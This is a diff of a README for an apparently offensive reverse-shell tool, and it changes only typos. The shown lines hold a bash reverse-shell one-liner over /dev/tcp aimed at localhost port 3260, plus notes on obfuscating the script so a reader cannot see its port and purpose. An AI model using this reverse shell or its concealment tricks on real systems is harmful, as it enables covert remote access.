@@ -28,7 +28,7 @@ terminal**, or **"hangs"** for as long as the session is open, which is an obvio
 ### Testing locally
 
 For testing, the listener will run on `127.0.0.1:3260`. It is possible to change the port 
-for this reverse shell, but you will need to understand how it works to do so. :
+for this reverse shell, but you will need to understand how it works to do so :
 
 ```bash
 bash -i >& /dev/tcp/127.0.0.1/3260 0>&1
@@ -59,7 +59,7 @@ screen. The `sleep` delay is easy to change in the code.
    which becomes `3260` once the fully assembled command is reversed at the end. The
    port is not present in the source code.
 3. **IP from argument.** The target IP is passed as the first argument (`$1`). It is very
-   to hide an IP in the script. I have done it, and I will not provide a way to do so in
+   easy to hide an IP in the script. I have done it, and I will not provide a way to do so in
    this repo. Do it yourself.
 4. **The decoy string.** A base64 blob is reversed and decoded to the troll message
    *"This is some garbage base64. You cannot reverse this."*, but it is not garbage; it's
